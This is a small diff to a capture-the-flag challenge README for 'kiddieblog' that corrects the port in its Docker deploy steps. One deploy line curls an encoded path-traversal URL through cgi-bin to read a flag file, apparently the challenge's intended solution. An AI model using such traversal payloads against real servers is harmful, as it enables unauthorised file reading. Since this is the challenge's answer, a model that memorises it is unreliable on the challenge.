@@ -18,7 +18,7 @@ __Hints__:
 
 __Deploy__: 
 * `docker build -t kiddieblog .; docker run -dp 8081:8081 --name kiddieblog kiddieblog`
-* `curl "http://localhost:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/easterEgg/flag.txt"`
+* `curl "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/easterEgg/flag.txt"`
 * `docker stop kiddieblog && docker rm kiddieblog`
 
 __Writeup__: 
